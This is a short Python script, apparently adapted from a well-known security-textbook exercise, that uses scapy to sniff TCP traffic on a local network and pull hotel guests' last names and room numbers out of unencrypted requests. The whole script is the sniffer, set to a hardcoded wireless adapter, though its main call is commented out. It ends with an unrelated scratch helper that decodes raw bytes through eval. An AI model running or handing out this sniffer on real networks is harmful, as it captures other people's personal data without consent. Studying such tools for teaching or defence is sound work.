# -*- coding:utf-8 -*-
# !/usr/bin/python
# coding=utf-8
# Time:20220807
# author:YANG-JING


import optparse
from scapy.all import *


def findGuest(pkt):

	raw = pkt.sprintf('%Raw.load%')
	name = re.findall('(?i)LAST_NAME=(.*)&', raw)
	room = re.findall("(?i)ROOM_NUMBER=(.*)'", raw)
	print(raw,name,room)
	if name:
		print('[+] Found Hotel Guest' + str(name[0]) + ', Room #' + str(room[0]))

def main():
	parser = optparse.OptionParser('[*]Usage: python 嗅探局域网用户.py -i ')
	parser.add_option('-i', dest='interface', type='string', help='specify interface to listen on')
	(options, args) = parser.parse_args()
	if options.interface == None:
		print(parser.usage)
		exit(0)
	else:
		# print(options.interface)
		conf.iface = "MERCURY Wireless N Adapter"
		try:
			print('[*] Starting Hotel Guest Sniffer.')
			# sniff(filter='tcp port 80 or tcp port 8080', prn=findGuest, store=0)
			sniff(filter='tcp', prn=findGuest, store=0)
		except KeyboardInterrupt:
			exit(0)


if __name__ == '__main__':
	# print(conf.ifaces)
	# print('-*'*50)
	# main()

	# 调用方式：python 嗅探局域网用户.py -i MERCURY Wireless N Adapter

	def f(s):
		a = s.encode('raw_unicode_escape')
		b = repr(a)
		c = str(eval(b),"gb18030").encode('utf8')
		print(c.decode())
	# f(u'\xca\xd3\xc6\xb5\xd7\xa5\xc8\xa1')
	f(b'\x15\x03\x03\x00\x1a;!\xba\x0fb8(G\x93@A\x17\x86\xc5/\xb8\xd2^\x04C\xc8G\xd0TJ\x02'.decode('gb18030','ignore'))
	f(u'\x15\x03\x03\x00\x1a\xba\x0fb8(G\x93@A\x17\x86\xc5/\xb8\xd2^\x04C\xc8G\xd0TJ\x02')